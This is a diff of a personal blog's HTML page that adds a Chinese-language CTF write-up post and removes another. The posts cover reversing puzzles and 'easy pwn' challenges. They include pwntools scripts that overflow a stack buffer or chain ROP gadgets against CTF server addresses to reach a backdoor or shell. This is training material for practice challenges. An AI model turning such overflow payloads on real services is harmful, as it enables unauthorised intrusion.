@@ -202,6 +202,79 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-MOCTF-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/31/MOCTF-1/" class="article-date">
+      <time datetime="2018-10-31T13:25:57.000Z" itemprop="datePublished">2018-10-31</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/31/MOCTF-1/">MOCTF-1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="SO-EASY"><a href="#SO-EASY" class="headerlink" title="SO EASY"></a>SO EASY</h1><p>虽然程序很大，但是在main函数里直接可以看见flag。</p>
+<h1 id="跳跳跳"><a href="#跳跳跳" class="headerlink" title="跳跳跳"></a>跳跳跳</h1><p>还是🎲游戏，千篇一律，nop掉判断就好了,最后给出的字符串base64解密得到flag。</p>
+<h1 id="暗恋的苦恼"><a href="#暗恋的苦恼" class="headerlink" title="暗恋的苦恼"></a>暗恋的苦恼</h1><p>给了加密程序，密文，密钥，要推算出明文。</p>
+<p>ida打开，定位到加密函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v7 = strlen(a1);</span><br><span class="line">v6 = strlen(a2);</span><br><span class="line">v4 = 0;</span><br><span class="line">v3 = operator new(0xFFu);</span><br><span class="line">for ( i = 0; i &lt; v7; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  if ( v4 == v6 )</span><br><span class="line">    v4 = 0;</span><br><span class="line">  v3[i] = sub_401005(a1[i], a2[v4++]);</span><br><span class="line">&#125;</span><br><span class="line">v3[i] = 0;</span><br><span class="line">return v3;</span><br></pre></td></tr></table></figure>
+<p>每一位密钥对每一位明文操作，当密钥用完时从头再取。<br>sub_401005:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = toupper(a1);</span><br><span class="line">v5 = toupper(a2);</span><br><span class="line">if ( v4 == &apos; &apos; )</span><br><span class="line">  return v4;</span><br><span class="line">for ( i = 0; i &lt; v4 - 65; ++i )</span><br><span class="line">  ++v5;</span><br><span class="line">if ( v5 &gt; 90 )</span><br><span class="line">  result = v5 - 25;</span><br><span class="line">else</span><br><span class="line">  result = v5;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
+<p>toupper是转换为大写。<code>v5+=v4-65</code>，然后根据v5的值决定返回值。<br>然而不知道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ( v5 &gt; 90 )</span><br><span class="line">  result = v5 - 25;</span><br><span class="line">else</span><br><span class="line">  result = v5;</span><br></pre></td></tr></table></figure>
+<p>这一部分怎么逆好，就把两种情况都写了…结合题目中有具体意义的提示应该也不失为一种方法吧23333:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mingwen=&quot;&quot;</span><br><span class="line">miwen=&quot;QWDRILDWNTW&quot;</span><br><span class="line">miyao=&quot;ILOVEMOCTF&quot;</span><br><span class="line">for i in range(len(miwen)):</span><br><span class="line">	v5=ord(miwen[i])</span><br><span class="line">	v4=65+v5-ord(miyao[i%9])</span><br><span class="line">	mingwen+=chr(v4)</span><br><span class="line">print mingwen</span><br><span class="line">mingwen=&quot;&quot;</span><br><span class="line">for i in range(len(miwen)):</span><br><span class="line">	v5=ord(miwen[i])+25</span><br><span class="line">	v4=65+v5-ord(miyao[i%9])</span><br><span class="line">	mingwen+=chr(v4)</span><br><span class="line">print mingwen</span><br></pre></td></tr></table></figure>
+<h1 id="crakeme2"><a href="#crakeme2" class="headerlink" title="crakeme2"></a>crakeme2</h1><p>简单的异或，逆运算得到一串十六进制数字，ascii得到flag。</p>
+<p><del>you get flag ， but it … -1s？XD</del></p>
+<h1 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy pwn"></a>easy pwn</h1><p>栈溢出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+4h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">gets(&amp;s);</span><br><span class="line">return puts(&amp;s);</span><br></pre></td></tr></table></figure>
+<p>后门函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0804850B                 public success</span><br><span class="line">.text:0804850B success         proc near</span><br><span class="line">.text:0804850B ; __unwind &#123;</span><br><span class="line">.text:0804850B                 push    ebp</span><br><span class="line">.text:0804850C                 mov     ebp, esp</span><br><span class="line">.text:0804850E                 sub     esp, 8</span><br><span class="line">.text:08048511                 sub     esp, 0Ch</span><br><span class="line">.text:08048514                 push    offset s        ; &quot;you success gets flag&quot;</span><br><span class="line">.text:08048519                 call    _puts</span><br><span class="line">.text:0804851E                 add     esp, 10h</span><br><span class="line">.text:08048521                 sub     esp, 0Ch</span><br><span class="line">.text:08048524                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048529                 call    _system</span><br><span class="line">.text:0804852E                 add     esp, 10h</span><br><span class="line">.text:08048531                 nop</span><br><span class="line">.text:08048532                 leave</span><br><span class="line">.text:08048533                 retn</span><br><span class="line">.text:08048533 ; &#125; // starts at 804850B</span><br></pre></td></tr></table></figure>
+<p>脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;139.199.177.55&quot;,10001)</span><br><span class="line">sh.recvuntil(&quot;easy?\n&quot;)</span><br><span class="line">system=0x0804850b</span><br><span class="line">payload=&apos;a&apos;*0x18+p32(0x0804850b)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-MCTF2018-2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -830,72 +903,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&quot;1&quot;)</span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">sh.recvuntil(&apos;token:&apos;)</span><br><span class="line">sh.sendline(&apos;GuessPigeon2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Please input your guess:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;yes/no?&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x78+p64(0x400933)+p64(0x600e20)+p64(0x4007cf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>成功进入shell，这题的flag也是藏在了..文件夹里，cd ..之后cat flag。</p>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-CNSSrecruit-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/13/CNSSrecruit-1/" class="article-date">
-      <time datetime="2018-10-13T08:28:12.000Z" itemprop="datePublished">2018-10-13</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/13/CNSSrecruit-1/">CNSSrecruit-1</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="RE签到题"><a href="#RE签到题" class="headerlink" title="RE签到题"></a>RE签到题</h1><p>shift+f12查看字符串</p>
-<h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p>一个小游戏，得到100w分得到flag，既然能用CE,为什么不用呢XD</p>
-<h1 id="海南鸽子"><a href="#海南鸽子" class="headerlink" title="海南鸽子"></a>海南鸽子</h1><p>关键部分：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%19s&quot;, &amp;v6);</span><br><span class="line">sub_401005(&amp;v6, (int)&amp;v2);</span><br><span class="line">for ( i = 0; i &lt; strlen(&amp;v2); ++i )</span><br><span class="line">  --*(&amp;v2 + i);</span><br><span class="line">if ( !strcmp(&amp;v2, &quot;X14yb2sEVk8BXWMkMiQ8&quot;) )</span><br><span class="line">  printf(&quot;Success!\n\n&quot;);</span><br><span class="line">else</span><br><span class="line">  printf(aWrongFlagO);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
-<p>sub401005是base64加密，判断方式为如果输入进行base64加密后，再每一位减去1,若与X14yb2sEVk8BXWMkMiQ8相等则success，逆运算得到flag。</p>
-<h1 id="推箱子游戏"><a href="#推箱子游戏" class="headerlink" title="推箱子游戏"></a>推箱子游戏</h1><p>题目直接提示了关键点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(&quot;./score.data&quot;, &quot;rb+&quot;);</span><br><span class="line">  if ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = 0LL;</span><br><span class="line">    v6 = 0LL;</span><br><span class="line">    v0 = 16LL;</span><br><span class="line">    fread(&amp;ptr, 0x10uLL, 1uLL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    puts(&quot;-----Score Board-----&quot;);</span><br><span class="line">    LODWORD(v3) = 0;</span><br><span class="line">    while ( (signed int)v3 &lt;= 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (unsigned int)(v3 + 1);</span><br><span class="line">      printf(&quot;level%d: %d steps\n&quot;, v0, *((unsigned int *)&amp;ptr + (signed int)v3), v3);</span><br><span class="line">      LODWORD(v3) = v3 + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( ptr == 0x2500000011LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = -8977570383032666059LL;</span><br><span class="line">      v8 = 4503996766676335161LL;</span><br><span class="line">      v9 = 51;</span><br><span class="line">      v10 = 105;</span><br><span class="line">      v11 = 52;</span><br><span class="line">      v12 = -122;</span><br><span class="line">      v13 = 78;</span><br><span class="line">      v14 = 105;</span><br><span class="line">      v15 = 102;</span><br><span class="line">      v16 = 67;</span><br><span class="line">      v17 = -124;</span><br><span class="line">      v18 = 108;</span><br><span class="line">      v19 = 58;</span><br><span class="line">      v20 = 51;</span><br><span class="line">      v21 = 75;</span><br><span class="line">      v22 = -106;</span><br><span class="line">      v23 = 0;</span><br><span class="line">      for ( HIDWORD(v3) = 0; SHIDWORD(v3) &lt;= 29; ++HIDWORD(v3) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_BYTE *)&amp;v7 + SHIDWORD(v3)) -= 48;</span><br><span class="line">        *((_BYTE *)&amp;v7 + SHIDWORD(v3)) ^= 0x66u;</span><br><span class="line">      &#125;</span><br><span class="line">      v0 = (unsigned __int64)&amp;v7;</span><br><span class="line">      printf(&quot;\n%s\n&quot;, &amp;v7, v3);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>这里有两个选择，一是根据<code>ptr==0x2500000011</code>，将score.data中的数据改成<code>1100 0000 2500 0000 0000 0000 0000 0000</code>,然后再打开scoreboard就可以触发条件得到flag，二是直接根据生成flag的函数计算出flag。</p>
-<h1 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h1><p>源码define了很多哲学词汇，例如deep♂dark♂fantasy。用sublime搜索全部然后替换掉就看起来很明白了，不过要注意的是，定义变量时也定义了很多带_的变量，不注意的话可能会替换错误，处理后代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char input[1024] = &#123; 0 &#125;;</span><br><span class="line">int aaa(char* b)</span><br><span class="line">&#123;</span><br><span class="line">	int v3 = 0,v2 = 0;</span><br><span class="line">	char key[] =&#123; 0,0,0,0x21, 0x5, 0x32, 0x43, 0x54, 0x21, 0x8, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1d, 0x32, 0x43, 0x54, 0x21, 0x7, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x55, 0x32, 0x43, 0x54, 0x21, 0x27, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1f, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x30, 0x32, 0x43, 0x54, 0x21, 0xb, 0x32, 0x43, 0x54, 0x21, 0x1b, 0x32, 0x43, 0x54 ,0x65&#125;;</span><br><span class="line">	int i = 0;</span><br><span class="line">	int i_ = 0;</span><br><span class="line">1:</span><br><span class="line">	int p__ = key[i ++];</span><br><span class="line">	if (p__== 0)</span><br><span class="line">		goto 1;</span><br><span class="line">	if (p__== 0x21)</span><br><span class="line">		goto 2;</span><br><span class="line">	if (p__== 0x32)</span><br><span class="line">		goto 3;</span><br><span class="line">	if (p__== 0x43)</span><br><span class="line">		goto 4;</span><br><span class="line">	if (p__== 0x54)</span><br><span class="line">		goto 5;</span><br><span class="line">	if (p__== 0x65)</span><br><span class="line">		goto 6;</span><br><span class="line">3:</span><br><span class="line">	v2 = input[i_ ++];</span><br><span class="line">	goto 7;</span><br><span class="line">4:</span><br><span class="line">	v3 = v3^0x66^v2;</span><br><span class="line">	goto 1;</span><br><span class="line">2:</span><br><span class="line">	v3 = key[i ++];</span><br><span class="line">	goto 7;</span><br><span class="line">7:</span><br><span class="line">	goto 1;</span><br><span class="line"></span><br><span class="line">5:</span><br><span class="line">	if (v3== 0)</span><br><span class="line">		goto 1;</span><br><span class="line">6:</span><br><span class="line"></span><br><span class="line">	return v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Please &quot;);</span><br><span class="line">	printf(&quot;input &quot;);</span><br><span class="line">	printf(&quot;flag:&quot;);</span><br><span class="line">	scanf(&quot;%s&quot;, input);</span><br><span class="line">	if(strlen(input)==15)</span><br><span class="line">		goto start;</span><br><span class="line">start:</span><br><span class="line">	int p = aaa(input);</span><br><span class="line">	if (p==0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;\no yes\n&quot;);</span><br><span class="line">		system(&quot;pause&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">end:</span><br><span class="line">	printf(&quot;\nnonono\n&quot;);</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析可以发现，根据key中的值，对input进行处理之后如果<code>v3=0</code>的话就可以了。key中<code>0x21,****,0x32,0x43,0x54</code>构成一个循环，操作是使得<code>****</code>处的值异或input中的值再异或<code>0x66</code>等于<code>0</code>，所以<code>input=****^0x66</code>，运算脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key=[0x5,0x8,0x15,0x15,0x1d,0x7,0x39,0x55,0x27,0x15,0x1f,0x39,0x30,0xb,0x1b]</span><br><span class="line">flag=&quot;&quot;.join([chr(i^0x66)for i in key])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
       
     </div>
     
